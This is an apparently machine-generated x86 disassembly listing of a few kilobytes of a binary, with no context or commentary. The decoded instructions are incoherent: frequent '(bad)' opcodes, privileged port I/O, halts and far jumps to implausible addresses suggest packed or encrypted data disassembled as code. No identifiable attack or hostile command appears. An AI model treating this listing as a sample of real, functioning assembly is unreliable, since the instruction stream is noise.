  419bb2:	shl    esi,0xd2
  419bb5:	repnz add BYTE PTR [edi],cl
  419bb8:	iret   
  419bb9:	retf   0xfae1
  419bbc:	std    
  419bbd:	in     al,dx
  419bbe:	fistp  QWORD PTR [edx+eiz*8-0x19393d14]
  419bc5:	in     al,0xb2
  419bc7:	fdiv   st,st(0)
  419bc9:	(bad)  
  419bcb:	icebp  
  419bcc:	ret    
  419bcd:	jmp    0x4c5:0xd9eec8d3
  419bd4:	loop   0x419b9c
  419bd6:	loop   0x419bad
  419bd8:	add    al,0xe7
  419bda:	push   es
  419bdb:	int3   
  419bdc:	out    0xf3,eax
  419bde:	retf   0xf0ca
  419be1:	loope  0x419ba5
  419be3:	enter  0xb6eb,0xe7
  419be7:	mov    bh,0xd1
  419be9:	repz (bad) 
  419bec:	stc    
  419bed:	cmc    
  419bee:	fmulp  st(5),st
  419bf0:	fadd   QWORD PTR [ebx]
  419bf2:	aam    0xe6
  419bf4:	(bad)  
  419bf6:	in     eax,0x5
  419bf8:	(bad)  
  419bf9:	call   0xcb437ac2
  419bfe:	fldcw  WORD PTR [eax-0x1e10494f]
  419c04:	retf   
  419c05:	mov    ebx,0xcccde6d4
  419c0a:	(bad)  
  419c0c:	sti    
  419c0d:	(bad)  
  419c0f:	in     al,dx
  419c10:	fscale 
  419c12:	add    eax,ebx
  419c14:	sti    
  419c15:	hlt    
  419c16:	rcr    esi,0xee
  419c19:	stc    
  419c1a:	out    dx,eax
  419c1b:	repz in eax,0x13
  419c1e:	shr    al,cl
  419c20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c22:	jmp    0xc9036118
  419c27:	stc    
  419c28:	mov    edx,0xdbf8b8b8
  419c2d:	(bad)  
  419c2e:	mov    esi,0x2fad9e3
  419c33:	mov    ebp,0xd703cafe
  419c38:	(bad)  
  419c39:	hlt    
  419c3a:	into   
  419c3b:	pop    es
  419c3c:	ror    ebx,cl
  419c3e:	shl    ecx,0xec
  419c41:	scas   eax,DWORD PTR es:[edi]
  419c42:	mov    al,0xc3
  419c44:	ret    0xf6b6
  419c47:	retf   0xedff
  419c4a:	mov    ah,0xd7
  419c4c:	jmp    0xe02a5a23
  419c51:	(bad)  
  419c52:	loopne 0x419c50
  419c54:	jecxz  0x419c39
  419c56:	stc    
  419c57:	retf   
  419c58:	cld    
  419c59:	hlt    
  419c5a:	jmp    0xc4a6:0xcb08e706
  419c61:	call   0xc7247f38
  419c66:	(bad)  
  419c67:	shr    BYTE PTR [ebp+0x3dbd6ff],cl
  419c6d:	fcmovnb st,st(1)
  419c6f:	mov    eax,0xbcbcdef1
  419c74:	repz std 
  419c76:	retf   0xc1fd
  419c79:	out    dx,al
  419c7a:	in     eax,dx
  419c7b:	lds    ecx,FWORD PTR [edi]
  419c7d:	add    eax,0xebe1e2ee
  419c82:	xlat   BYTE PTR ds:[ebx]
  419c83:	in     eax,0xbb
  419c85:	out    0xf7,eax
  419c87:	enter  0xe5de,0xf8
  419c8b:	enter  0xefd6,0xb7
  419c8f:	std    
  419c90:	rcl    cl,cl
  419c92:	std    
  419c93:	aad    0xd9
  419c95:	sti    
  419c96:	fcmovnu st,st(5)
  419c98:	sti    
  419c99:	add    ebx,ebp
  419c9b:	repz cli 
  419c9d:	fbstp  TBYTE PTR [edx-0x3f491d11]
  419ca3:	aam    0xed
  419ca5:	into   
  419ca6:	int3   
  419ca7:	not    dh
  419ca9:	in     al,0xf9
  419cab:	fdiv   st,st(0)
  419cad:	in     al,dx
  419cae:	in     eax,dx
  419caf:	shl    esi,cl
  419cb1:	stc    
  419cb2:	rcl    al,cl
  419cb4:	ret    0xf806
  419cb7:	in     eax,0xe1
  419cb9:	lds    ecx,FWORD PTR [ebx]
  419cbb:	fmulp  st(5),st
  419cbd:	(bad)  
  419cbe:	mov    edi,0xf2adccf2
  419cc3:	loopne 0x419c77
  419cc5:	mov    al,0xf3
  419cc7:	dec    edx
  419cc9:	mov    edi,0xf0f2ffeb
  419cce:	cli    
  419ccf:	fdivr  QWORD PTR [eax-0x3a0723ff]
  419cd5:	cld    
  419cd6:	loopne 0x419cd8
  419cd8:	add    eax,0xee5e7c5
  419cdd:	or     ebp,ebx
  419cdf:	fsub   DWORD PTR [ebp-0x2a2c2f14]
  419ce5:	mov    ah,0xf2
  419ce7:	(bad)  
  419cea:	(bad)
  419ced:	cmc    
  419cee:	into   
  419cef:	int3   
  419cf0:	fdivr  QWORD PTR [ebp+0xddbedb]
  419cf6:	add    edi,DWORD PTR [esi-0x3a17032c]
  419cfc:	cld    
  419cfd:	out    0xd3,al
  419cff:	jmp    0xc2f24fb3
  419d04:	iret   
  419d05:	(bad)  
  419d06:	aam    0xd0
  419d08:	not    ebp
  419d0a:	shl    cl,1
  419d0c:	cmc    
  419d0d:	mov    eax,0xfff7d5c3
  419d12:	fiadd  DWORD PTR [ebx]
  419d14:	rcr    ebp,cl
  419d16:	shl    ch,0xff
  419d19:	(bad)  
  419d1a:	leave  
  419d1b:	jecxz  0x419d07
  419d1d:	clc    
  419d1e:	out    0xf7,eax
  419d20:	mov    edi,0xc4d2aed0
  419d25:	ret    0xe6ee
  419d28:	aad    0xb4
  419d2a:	aad    0xd5
  419d2c:	icebp  
  419d2d:	add    DWORD PTR [edx],eax
  419d2f:	rol    BYTE PTR [edi],0xdc
  419d32:	add    dl,dh
  419d34:	add    ah,al
  419d36:	jecxz  0x419d14
  419d38:	fcmovnb st,st(4)
  419d3a:	aad    0xca
  419d3c:	retf   0xf2cb
  419d3f:	ror    ah,0xb0
  419d42:	out    dx,al
  419d43:	shl    dl,1
  419d45:	test   ecx,0xbfd1cad4
  419d4b:	(bad)  
  419d4d:	in     eax,dx
  419d4e:	in     al,dx
  419d4f:	fcomi  st,st(2)
  419d51:	test   dl,0xfb
  419d54:	sar    ebx,1
  419d56:	fdivr  QWORD PTR [esi+0xbe6def7]
  419d5c:	or     cl,bh
  419d5e:	jmp    0xbbc5:0xc9b7efe3
  419d65:	mov    al,0xf4
  419d67:	jmp    0x419d22
  419d69:	retf   
  419d6a:	retf   
  419d6b:	fcmovne st,st(7)
  419d6d:	jmp    0xbdbf:0xeefafade
  419d74:	or     ebx,esp
  419d76:	loop   0x419d80
  419d78:	shl    esi,0x4
  419d7b:	call   0xcb218583
  419d80:	ret    
  419d81:	mov    bl,0xf2
  419d83:	out    dx,al
  419d84:	test   eax,0xd3dac8ea
  419d89:	cmc    
  419d8a:	enter  0xf7e8,0xce
  419d8e:	mov    bh,0xdb
  419d90:	loope  0x419d73
  419d92:	(bad)  
  419d93:	rol    BYTE PTR [ecx],1
  419d95:	dec    ebx
  419d97:	jmp    0x419d7e
  419d99:	in     al,0xb
  419d9b:	stc    
  419d9c:	add    ch,al
  419d9e:	(bad)  
  419d9f:	fsub   st,st(2)
  419da1:	in     eax,0xab
  419da3:	mov    cl,0xeb
  419da5:	in     al,0xe4
  419da7:	enter  0xb0d8,0xdc
  419dab:	icebp  
  419dac:	cli    
  419dad:	fdiv   st(3),st
  419daf:	out    dx,al
  419db0:	rol    bh,cl
  419db2:	vpmuludq ymm3,ymm4,ymm5
  419db6:	out    0xc0,al
  419db8:	fimul  WORD PTR [ebx]
  419dba:	out    dx,al
  419dbb:	pmaxub mm3,mm6
  419dbe:	ror    bl,cl
  419dc0:	jmp    0xe6e1:0xe4c6c4ec
  419dc7:	mov    al,0xf9
  419dc9:	mov    bh,0xf0
  419dcb:	shl    DWORD PTR [eax+edi*8+0x5d4f2d2],cl
  419dd2:	xlat   BYTE PTR ds:[ebx]
  419dd3:	or     eax,DWORD PTR [ecx]
  419dd5:	(bad)  
  419dd7:	fild   WORD PTR [edi]
  419dd9:	fld    DWORD PTR ds:0xf2e8dc02
  419ddf:	iret   
  419de0:	ret    
  419de1:	call   0xc7296899
  419de6:	jmp    0x3f9:0xc8d1b7e4
  419ded:	mov    ebx,0xcccfd300
  419df2:	cld    
  419df3:	in     al,dx
  419df4:	sti    
  419df5:	rol    ch,0xdc
  419df8:	cli    
  419df9:	(bad)
  419dfc:	(bad)  
  419dfe:	mov    eax,0xd0cbc9ac
  419e03:	shr    edi,0xac
  419e06:	iret   
  419e07:	(bad)  
  419e08:	fsubrp st(6),st
  419e0a:	shl    BYTE PTR [edx-0x1f0e4602],cl
  419e10:	out    0xc2,al
  419e12:	mov    ebx,0xf4ddf4
  419e17:	lock fxch st(1)
  419e1a:	loop   0x419e14
  419e1c:	into   
  419e1d:	icebp  
  419e1e:	mov    ecx,0xe9cee3bf
  419e23:	repnz loopne 0x419dd7
  419e26:	fldpi  
  419e28:	out    0xfd,al
  419e2a:	aam    0xf4
  419e2c:	cmc    
  419e2d:	ret    0xc2f3
  419e30:	inc    BYTE PTR [ecx]
  419e32:	in     al,0xfa
  419e34:	loopne 0x419df6
  419e36:	aam    0x9
  419e38:	add    esp,ebx
  419e3a:	std    
  419e3b:	pop    es
  419e3c:	adc    al,BYTE PTR [edi]
  419e3e:	in     eax,0xe4
  419e40:	out    dx,eax
  419e41:	scas   eax,DWORD PTR es:[edi]
  419e42:	enter  0xb0f3,0xba
  419e46:	mov    cl,0xe4
  419e48:	mov    ecx,0xfab6e9e6
  419e4d:	(bad)  
  419e4f:	repnz cmc 
  419e51:	out    0xfd,al
  419e53:	out    0xcb,eax
  419e55:	jmp    0xfade:0x1f5c2cb
  419e5c:	femms  
  419e5e:	fmul   st(5),st
  419e60:	out    dx,eax
  419e61:	loopne 0x419e48
  419e63:	out    0xc6,al
  419e65:	retf   0xcdd9
  419e68:	jmp    0x419e1a
  419e6a:	call   0xb9158859
  419e6f:	not    dh
  419e71:	ret    0xdbf9
  419e74:	loop   0x419e6c
  419e76:	stc    
  419e77:	loop   0x419e3d
  419e79:	or     ch,ah
  419e7b:	push   cs
  419e7c:	out    dx,al
  419e7d:	out    dx,eax
  419e7e:	test   al,0xf3
  419e80:	iret   
  419e81:	repz jmp 0xb42e826c
  419e87:	cmc    
  419e88:	mov    ch,0xe9
  419e8a:	test   edx,0xf8ecd7d0
  419e90:	jecxz  0x419e90
  419e92:	(bad)  
  419e93:	fld    QWORD PTR [edx]
  419e95:	(bad)  
  419e96:	retf   
  419e97:	out    0xe9,eax
  419e99:	jecxz  0x419e96
  419e9b:	ret    0xfae7
  419e9e:	fadd   st,st(7)
  419ea0:	mov    esp,0xa9f5bde3
  419ea5:	aad    0xe0
  419ea7:	retf   
  419ea8:	repz enter 0xcfc5,0xb9
  419ead:	iret   
  419eae:	loope  0x419ea9
  419eb0:	in     eax,dx
  419eb1:	loopne 0x419e79
  419eb3:	in     al,0xe0
  419eb5:	retf   0xd5f9
  419eb8:	out    0xfa,eax
  419eba:	(bad)  
  419ebb:	in     al,0xa
  419ebd:	or     BYTE PTR [ecx-0x5230211f],ch
  419ec3:	out    0xcc,eax
  419ec5:	leave  
  419ec6:	shl    dh,1
  419ec8:	in     eax,dx
  419ec9:	iret   
  419eca:	ror    bl,cl
  419ecc:	add    cl,ah
  419ece:	loop   0x419ed3
  419ed0:	(bad)  
  419ed1:	mov    esp,0xf9e0dcfb
  419ed6:	(bad)  
  419ed8:	add    al,BYTE PTR [ecx]
  419eda:	add    ebx,esp
  419edc:	retf   0xc9fd
  419edf:	les    esi,FWORD PTR [edi-0x1e4f1649]
  419ee5:	retf   
  419ee6:	mov    cl,0xda
  419ee8:	cmc    
  419ee9:	jmp    0x419ec1
  419eeb:	mov    ecx,0xbdd1cd02
  419ef0:	add    ebp,ebp
  419ef2:	fcmovnbe st,st(0)
  419ef4:	hlt    
  419ef5:	jmp    0x419efd
  419ef7:	jmp    0x419ed2
  419ef9:	jmp    0x419ec5
  419efb:	or     ebx,edx
  419efd:	std    
  419efe:	(bad)  [ecx-0xc2d100d]
  419f04:	jecxz  0x419eea
  419f06:	call   0xd91650fc
  419f0b:	not    bh
  419f0d:	jmp    0xfbd0:0xf7da0200
  419f14:	aam    0x0
  419f16:	in     eax,0xe3
  419f18:	in     al,0xdd
  419f1a:	leave  
  419f1b:	jecxz  0x419f30
  419f1d:	or     dh,cl
  419f1f:	int    0xe4
  419f21:	lods   al,BYTE PTR ds:[esi]
  419f22:	stos   DWORD PTR es:[edi],eax
  419f23:	in     eax,0xe6
  419f25:	mov    dl,0xd8
  419f27:	cmc    
  419f28:	rcl    ch,1
  419f2a:	mov    dh,0xe4
  419f2c:	hlt    
  419f2d:	mov    esp,0xe2f8dbe0
  419f32:	in     eax,0xf2
  419f34:	(bad)  
  419f35:	aam    0xf5
  419f37:	stc    
  419f38:	or     esi,esi
  419f3a:	fimul  WORD PTR [eax+ebx*8]
  419f3d:	in     al,dx
  419f3e:	int3   
  419f3f:	out    0xa8,eax
  419f41:	mov    bh,0xad
  419f43:	fcmovne st,st(1)
  419f45:	mov    bl,0xef
  419f47:	(bad)  
  419f48:	aad    0xd9
  419f4a:	mov    ecx,0xdbfcbaf7
  419f4f:	loope  0x419f38
  419f51:	repz add eax,0xc9fec7f0
  419f57:	retf   
  419f58:	push   cs
  419f59:	idiv   dl
  419f5b:	leave  
  419f5c:	fild   DWORD PTR [ecx]
  419f5e:	shr    BYTE PTR [edi-0xb151134],0xec
  419f65:	cmc    
  419f66:	lock mov eax,0xc8cecfe4
  419f6c:	fcmovu st,st(5)
  419f6e:	repz mov esi,0xbbbd9f4
  419f74:	repnz (bad) 
  419f76:	cli    
  419f77:	fsqrt  
  419f79:	out    0xeb,eax
  419f7b:	or     eax,ebp
  419f7d:	out    0xb9,al
  419f7f:	int3   
  419f80:	lods   al,BYTE PTR ds:[esi]
  419f81:	jmp    0xe316754b
  419f86:	jmp    0xe3eb:0xf2e5ffb9
  419f8d:	mov    edx,0xb8d4d3f6
  419f92:	(bad)  
  419f93:	aam    0xd1
  419f95:	add    esp,ebx
  419f97:	imul   ebx
  419f99:	clc    
  419f9a:	(bad)  
  419f9c:	push   cs
  419f9d:	clc    
  419f9e:	loop   0x419f6d
  419fa0:	loopne 0x419f66
  419fa2:	mov    esp,0xd5e1b5d3
  419fa7:	(bad)  
  419fa8:	call   0xff3e7496
  419fad:	jecxz  0x419f77
  419faf:	(bad)  
  419fb0:	rcr    edx,1
  419fb2:	add    edx,edi
  419fb4:	lock (bad) 
  419fb7:	shl    ch,0xea
  419fba:	add    ecx,DWORD PTR [ecx]
  419fbc:	in     eax,0xec
  419fbe:	repnz int 0xe6
  419fc1:	out    dx,eax
  419fc2:	lods   eax,DWORD PTR ds:[esi]
  419fc3:	in     al,0xee
  419fc5:	xlat   BYTE PTR ds:[ebx]
  419fc6:	jmp    0xf0eb:0xced7ceed
  419fcd:	sti    
  419fce:	hlt    
  419fcf:	(bad)  
  419fd1:	cld    
  419fd2:	mov    BYTE PTR [eax],0xdb
  419fd5:	out    0xd4,eax
  419fd7:	loop   0x419fd5
  419fd9:	push   cs
  419fda:	add    edi,edx
  419fdc:	rcl    DWORD PTR [ecx],cl
  419fde:	mov    edx,0xcabcecc6
  419fe4:	(bad)  
  419fe6:	sti    
  419fe7:	mov    al,0xd2
  419fe9:	mov    edx,0xcc03d2ee
  419fee:	out    dx,eax
  419fef:	rol    edi,cl
  419ff1:	shl    dl,cl
  419ff3:	pop    es
  419ff4:	sti    
  419ff5:	(bad)  
  419ff7:	or     bh,al
  419ff9:	mov    BYTE PTR [ebx],0xc8
  419ffc:	out    dx,al
  419ffd:	in     eax,dx
  419ffe:	f2xm1  
  41a000:	test   eax,0xe7c5e8f5
  41a005:	jmp    0xf52951dd
  41a00a:	std    
  41a00b:	mov    esi,0xf4f7f0ba
  41a010:	test   esi,0x2dfe2c2
  41a016:	or     esi,eax
  41a018:	add    al,0xce
  41a01a:	out    0xdd,eax
  41a01c:	fmul   st,st(5)
  41a01e:	in     al,0xcb
  41a020:	(bad)  [edi-0x4a523016]
  41a026:	mov    bh,0xd4
  41a028:	stc    
  41a029:	out    0xf1,al
  41a02b:	int3   
  41a02c:	fsin   
  41a02e:	iret   
  41a02f:	fld    QWORD PTR [ecx]
  41a031:	jecxz  0x419ff3
  41a033:	fiadd  WORD PTR [ecx]
  41a035:	vpsubw xmm0,xmm7,XMMWORD PTR [esi]
  41a039:	(bad)  
  41a03a:	retf   0xf0e
  41a03d:	retf   
  41a03e:	leave  
  41a03f:	mov    esp,0xe5cbcbd0
  41a044:	ret    0xfbf9
  41a047:	(bad)  
  41a048:	call   0xf0379307
  41a04d:	fcomp  st(3)
  41a04f:	out    dx,eax
  41a050:	int3   
  41a051:	mov    esi,0xc606f1c1
  41a057:	fild   WORD PTR [ecx]
  41a059:	dec    BYTE PTR [ebx]
  41a05b:	in     eax,0xd
  41a05d:	push   es
  41a05e:	jmp    0xb0eb:0xd7b7cce4
  41a065:	sar    al,1
  41a067:	enter  0xb7f2,0xe9
  41a06b:	out    dx,al
  41a06c:	into   
  41a06d:	test   edx,0x7f7b9bd
  41a073:	rcl    ebx,1
  41a075:	ret    0x800
  41a078:	cld    
  41a079:	clc    
  41a07a:	pop    es
  41a07b:	pop    es
  41a07c:	sti    
  41a07d:	retf   
  41a07e:	(bad)  
  41a07f:	shl    edx,1
  41a081:	(bad)  
  41a082:	retf   
  41a083:	fcmovnbe st,st(3)
  41a085:	(bad)  
  41a086:	mov    bh,0xb2
  41a088:	xlat   BYTE PTR ds:[ebx]
  41a089:	mov    edi,0xbafef0be
  41a08e:	not    ebp
  41a090:	in     eax,dx
  41a091:	shl    ah,cl
  41a093:	cli    
  41a094:	icebp  
  41a095:	cld    
  41a096:	(bad)  
  41a098:	cld    
  41a099:	(bad)  
  41a09a:	(bad)  
  41a09c:	out    0xcd,eax
  41a09e:	in     eax,0xc9
  41a0a0:	jmp    0x41a046
  41a0a2:	mov    esp,0xd3e5e6bc
  41a0a7:	(bad)
  41a0aa:	call   0xdd3da48c
  41a0af:	cli    
  41a0b0:	cli    
  41a0b1:	mov    esp,0xc105c2d0
  41a0b6:	loopne 0x41a07a
  41a0b8:	sti    
  41a0b9:	(bad)  
  41a0ba:	loop   0x41a07e
  41a0bc:	push   cs
  41a0bd:	cli    
  41a0be:	mov    cl,0xf0
  41a0c0:	rcl    ebx,cl
  41a0c2:	mov    esp,0xdbe9adcd
  41a0c7:	div    DWORD PTR [eax-0x2215123c]
  41a0cd:	mov    ebx,0x3ddd7d3
  41a0d2:	mov    ebx,0xe2d8c0f0
  41a0d7:	xlat   BYTE PTR ds:[ebx]
  41a0d8:	clc    
  41a0d9:	add    eax,0xfae0e9df
  41a0de:	mov    esp,0xf7ccbdcf
  41a0e3:	in     al,0xda
  41a0e5:	jmp    0xe01990d7
  41a0ea:	rcl    dh,1
  41a0ec:	idiv   bl
  41a0ee:	add    dl,al
  41a0f0:	rcl    cl,1
  41a0f2:	loop   0x41a0b8
  41a0f4:	rcr    ebp,cl
  41a0f6:	fld    QWORD PTR [esi]
  41a0f8:	add    eax,0xeee8defd
  41a0fd:	loope  0x41a0d2
  41a0ff:	out    0xe8,eax
  41a101:	into   
  41a102:	loop   0x41a0db
  41a104:	in     al,0xd7
  41a106:	mov    ah,0xe6
  41a108:	mov    ecx,0xb4d6dbee
  41a10d:	in     al,dx
  41a10e:	(bad)  
  41a110:	mov    eax,0xded6d4fd
  41a115:	clc    
  41a116:	(bad)  
  41a118:	(bad)  
  41a119:	retf   
  41a11a:	out    dx,al
  41a11b:	add    bl,ch
  41a11d:	jecxz  0x41a105
  41a11f:	test   al,0xc1
  41a121:	mov    bl,0xca
  41a123:	aad    0xac
  41a125:	sar    DWORD PTR [ebx-0x4b462e11],1
  41a12b:	jmp    0xb4c3:0xf7b8d1d1
  41a132:	out    0xf8,al
  41a134:	in     eax,0xf5
  41a136:	(bad)  
  41a137:	(bad)  
  41a139:	fsubp  st(2),st
  41a13b:	or     ebp,ebp
  41a13d:	retf   
  41a13e:	call   0xf80f4b0d
  41a143:	shl    edx,0xce
  41a146:	fmul   st,st(2)
  41a148:	lods   eax,DWORD PTR ds:[esi]
  41a149:	clc    
  41a14a:	mov    edx,0xd4faedbd
  41a14f:	(bad)  
  41a150:	fcmovnbe st,st(3)
  41a152:	add    eax,DWORD PTR [eiz*8-0x11fdf43d]
  41a159:	add    al,0x6
  41a15b:	adc    esp,ebp
  41a15d:	iret   
  41a15e:	in     al,0xb0
  41a160:	mov    al,0xd6
  41a162:	hlt    
  41a163:	test   bl,0xe7
  41a166:	enter  0xf7c6,0xea
  41a16a:	call   0xfe2e7a52
  41a16f:	add    al,BYTE PTR [esi]
  41a171:	hlt    
  41a172:	rol    BYTE PTR [ebx],1
  41a174:	jmp    0x41a170
  41a176:	retf   0xeaff
  41a179:	loop   0x41a178
  41a17b:	or     al,0x2
  41a17d:	fldcw  WORD PTR [edx-0x14372833]
  41a183:	(bad)  
  41a184:	mov    bh,0xb5
  41a186:	into   
  41a187:	shl    edi,cl
  41a189:	mov    dh,0xb9
  41a18b:	fdivr  DWORD PTR [edi-0x1d1d2445]
  41a191:	in     eax,dx
  41a192:	fdivr  st(7),st
  41a194:	cld    
  41a195:	or     ebp,ebx
  41a197:	add    bl,cl
  41a199:	fld    st(6)
  41a19b:	adc    ebp,ebx
  41a19d:	add    al,dl
  41a19f:	loop   0x41a16b
  41a1a1:	int    0xad
  41a1a3:	out    0xd0,al
  41a1a5:	shl    DWORD PTR [ecx-0x30222a13],cl
  41a1ab:	retf   0xdeef
  41a1ae:	iret   
  41a1af:	fst    st(1)
  41a1b1:	rol    edi,0xd1
  41a1b4:	fadd   DWORD PTR [eax]
  41a1b6:	(bad)  
  41a1b7:	fadd   st(7),st
  41a1b9:	(bad)  
  41a1bb:	retf   0xf309
  41a1be:	enter  0xead3,0xe9
  41a1c2:	mov    ch,0xc9
  41a1c4:	rcl    bh,1
  41a1c6:	clc    
  41a1c7:	in     al,0xb5
  41a1c9:	mov    al,0xe9
  41a1cb:	icebp  
  41a1cc:	mov    eax,0xf0e8d3bb
  41a1d1:	clc    
  41a1d2:	out    0xf3,eax
  41a1d4:	repnz pop es
  41a1d6:	fisttp WORD PTR [ecx]
  41a1d8:	jmp    0xa4968a3
  41a1dd:	out    0xc7,al
  41a1df:	mov    eax,0xd1d6c4be
  41a1e4:	les    ebp,FWORD PTR [esp+ecx*8-0x45405209]
  41a1eb:	mov    esp,0xeedec2fa
  41a1f0:	rol    al,1
  41a1f2:	cli    
  41a1f3:	mov    ebp,0xd0e0dff5
  41a1f8:	fdiv   st(4),st
  41a1fa:	add    esp,eax
  41a1fc:	(bad)  [ecx]
  41a1fe:	lods   al,BYTE PTR ds:[esi]
  41a1ff:	loop   0x41a1c9
  41a201:	(bad)  
  41a202:	jmp    0xc9df:0xc0dbc1db
  41a209:	(bad)  
  41a20a:	iret   
  41a20b:	fdivr  st,st(6)
  41a20d:	stc    
  41a20e:	mov    eax,0xfdf2d8fe
  41a213:	lock std 
  41a215:	add    al,0xf7
  41a217:	loop   0x41a217
  41a219:	loope  0x41a21f
  41a21b:	out    dx,al
  41a21c:	(bad)  
  41a21e:	jmp    0xb2f4:0xdcb2eed3
  41a225:	fptan  
  41a227:	lock in eax,dx
  41a229:	fcmovne st,st(0)
  41a22b:	lock std 
  41a22d:	(bad)  
  41a22e:	imul   ebp
  41a230:	xlat   BYTE PTR ds:[ebx]
  41a231:	(bad)  
  41a232:	sar    esp,cl
  41a234:	add    bh,bh
  41a236:	rol    DWORD PTR [esi],1
  41a238:	iret   
  41a239:	out    dx,al
  41a23a:	out    0xd,eax
  41a23c:	int3   
  41a23d:	in     eax,dx
  41a23e:	out    0xec,eax
  41a240:	jmp    0xcdd2:0xedececb6
  41a247:	clc    
  41a248:	aad    0xc4
  41a24a:	(bad)  
  41a24b:	not    eax
  41a24d:	test   esp,0xdbdbf9ce
  41a253:	jecxz  0x41a22e
  41a255:	test   BYTE PTR [eax],0xb
  41a258:	(bad)  
  41a25a:	or     ecx,DWORD PTR [edi]
  41a25c:	or     eax,0xbdb0d2ec
  41a261:	int3   
  41a262:	mov    al,0xb3
  41a264:	jmp    0xca065451
  41a269:	mov    edi,0xb8d6d3f7
  41a26e:	leave  
  41a26f:	not    edx
  41a271:	out    0xc1,eax
  41a273:	sar    ah,1
  41a275:	ret    
  41a276:	lock std 
  41a278:	leave  
  41a279:	add    edi,ebx
  41a27b:	fmul   st,st(7)
  41a27d:	enter  0xcce4,0xb3
  41a281:	mov    esi,0xc8fbb2c0
  41a286:	int3   
  41a287:	fxam   
  41a289:	call   0x385863
  41a28e:	std    
  41a28f:	rcr    ebp,cl
  41a291:	aad    0xf5
  41a293:	add    al,BYTE PTR [edx]
  41a295:	(bad)
  41a298:	in     eax,0xd8
  41a29a:	fmul   st,st(6)
  41a29c:	into   
  41a29d:	shr    DWORD PTR [ecx-0x4e2f4318],cl
  41a2a3:	rcl    al,cl
  41a2a5:	repnz shl BYTE PTR [ebp-0x1c34103a],1
  41a2ac:	std    
  41a2ad:	fcomp  st(1)
  41a2af:	mov    ecx,0xc0fbf5cf
  41a2b4:	in     eax,0xe2
  41a2b6:	fldpi  
  41a2b8:	lsl    ecx,ax
  41a2bb:	fimul  DWORD PTR [edi]
  41a2bd:	or     eax,0xd5b0ccca
  41a2c2:	rol    ch,0xc2
  41a2c5:	test   al,0xb1
  41a2c7:	repz lock retf 0xf7c9
  41a2cc:	leave  
  41a2cd:	stc    
  41a2ce:	(bad)  
  41a2d0:	std    
  41a2d1:	ret    0xebc2
  41a2d4:	imul   edx
  41a2d6:	jmp    0xfacd:0xeaf6fcf5
  41a2dd:	out    dx,eax
  41a2de:	fidiv  WORD PTR [edx-0x382c0c50]
  41a2e4:	out    dx,eax
  41a2e5:	retf   0xf2c8
  41a2e8:	int    0xed
  41a2ea:	fucomp st(7)
  41a2ec:	mov    eax,0xe200fbe2
  41a2f1:	imul   ch
  41a2f3:	jmp    0x41a2b7
  41a2f5:	std    
  41a2f6:	xlat   BYTE PTR ds:[ebx]
  41a2f7:	not    ah
  41a2f9:	or     bh,bl
  41a2fb:	int    0xe4
  41a2fd:	enter  0xd2af,0xc6
  41a301:	scas   eax,DWORD PTR es:[edi]
  41a302:	jmp    0xede6:0xd0b3bbe6
  41a309:	(bad)  [edi-0x44150d36]
  41a30f:	ret    
  41a310:	fdiv   QWORD PTR [ebp+ecx*8-0x2b1b0bfd]
  41a317:	cld    
  41a318:	fild   DWORD PTR [esi]
  41a31a:	fucomip st,st(0)
  41a31c:	add    bh,bl
  41a31e:	rcr    al,0xae
  41a321:	in     eax,dx
  41a322:	not    ah
  41a324:	jmp    0x41a2f7
  41a326:	cmc    
  41a327:	call   0xdd3c96dd
  41a32c:	jmp    0x1c6:0xdadff401
  41a333:	out    0xa,al
  41a335:	(bad)  
  41a336:	fiadd  WORD PTR [ecx]
  41a338:	bswap  edi
  41a33a:	retf   
  41a33b:	fucomi st,st(6)
  41a33d:	frstor [edi-0x134e0d44]
  41a343:	retf   
  41a344:	les    ebp,FWORD PTR [eax-0x53453a0d]
  41a34a:	in     eax,dx
  41a34b:	add    edx,edx
  41a34d:	fcomi  st,st(3)
  41a34f:	rol    DWORD PTR [esi],cl
  41a351:	in     al,dx
  41a352:	add    ebp,edi
  41a354:	in     al,0xd5
  41a356:	(bad)  
  41a358:	test   DWORD PTR [esi],0xfce00cc3
  41a35e:	into   
  41a35f:	in     al,dx
  41a360:	repz into 
  41a362:	scas   eax,DWORD PTR es:[edi]
  41a363:	xlat   BYTE PTR ds:[ebx]
  41a364:	mov    bl,0xb6
  41a366:	(bad)  
  41a367:	iret   
  41a368:	leave  
  41a369:	mov    bh,0xd1
  41a36b:	out    dx,eax
  41a36c:	mov    ah,0x2
  41a36e:	loope  0x41a360
  41a370:	aad    0xd8
  41a372:	sar    dh,1
  41a374:	mov    ebp,0x7f50905
  41a379:	aam    0x3
  41a37b:	call   0xbfe8a853
  41a380:	out    0xed,eax
  41a382:	lods   eax,DWORD PTR ds:[esi]
  41a383:	leave  
  41a384:	shl    DWORD PTR [ecx-0x4a2f452c],0xf2
  41a38b:	mov    dl,0xba
  41a38d:	enter  0xcdff,0xb8
  41a391:	sar    al,0xf0
  41a394:	in     eax,0xd4
  41a396:	(bad)  
  41a397:	(bad)  
  41a398:	cli    
  41a399:	stc    
  41a39a:	or     edx,eax
  41a39c:	or     ebp,ebx
  41a39e:	repnz lods eax,DWORD PTR ds:[esi]
  41a3a0:	jecxz  0x41a36e
  41a3a2:	retf   0xd6c3
  41a3a5:	mov    ch,0xb0
  41a3a7:	(bad)  
  41a3a9:	rol    ch,1
  41a3ab:	jecxz  0x41a39c
  41a3ad:	out    dx,al
  41a3ae:	into   
  41a3af:	clc    
  41a3b0:	int    0xdb
  41a3b2:	xlat   BYTE PTR ds:[ebx]
  41a3b3:	fdivr  st(4),st
  41a3b5:	(bad)  
  41a3b6:	jmp    0xdfdc:0xf8e1
  41a3bd:	or     dl,cl
  41a3bf:	in     al,dx
  41a3c0:	jmp    0xe8c8:0xeae0d1e6
  41a3c7:	jmp    0xd2d9:0xfdcaf7ea
  41a3ce:	div    BYTE PTR [esi-0x3e2c2f0a]
  41a3d4:	out    0x6,eax
  41a3d6:	xlat   BYTE PTR ds:[ebx]
  41a3d7:	(bad)  
  41a3d8:	fmulp  st(3),st
  41a3da:	(bad)  
  41a3dc:	in     al,0x1
  41a3de:	lds    edi,FWORD PTR [ebp-0xc2a0f2d]
  41a3e4:	sti    
  41a3e5:	out    dx,al
  41a3e6:	in     eax,0xd5
  41a3e8:	rcl    edx,1
  41a3ea:	cmc    
  41a3eb:	(bad)  
  41a3ec:	int3   
  41a3ed:	fcmovnbe st,st(7)
  41a3ef:	cld    
  41a3f0:	clc    
  41a3f1:	out    0xfe,al
  41a3f3:	add    ecx,DWORD PTR [ebx]
